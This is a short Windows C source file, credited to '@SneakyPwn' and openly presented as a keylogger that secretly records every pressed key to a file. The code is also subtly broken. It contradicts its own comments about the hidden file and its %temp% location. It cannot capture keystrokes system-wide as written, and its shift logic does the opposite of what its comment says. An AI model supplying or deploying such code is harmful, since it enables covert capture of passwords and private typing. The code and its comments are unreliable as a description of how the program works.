#include <windows.h>
#include <stdio.h>

// Key Logger Code By : @SneakyPwn

//  This program will create a hidden .txt file in the %temp% directory and write all pressed keys into it.

int main()
{
    // Create a hidden txt file in temp dir. If file exists, do nothing.
    FILE *f = fopen("C:\\Users\\Public\\Documents\\keylog.txt", "a");
    if (f == NULL)
        return EXIT_FAILURE;

    while (1)
    {
        // Wait until a key is pressed
        MSG msg;
        GetMessage(&msg, NULL, 0, 0);

        // Get the ASCII value of the pressed key
        int ascii = msg.wParam & 0xFF;

        // Check if the Shift key was pressed
        BOOL shiftPressed = msg.lParam & (1 << 24);
        if (shiftPressed)
            ascii += 32; // Convert lowercase letters to uppercase

        // Write the ASCII value of the pressed key to the file
        fprintf(f, "%d ", ascii);
    }

    fclose(f);
    return EXIT_SUCCESS;
}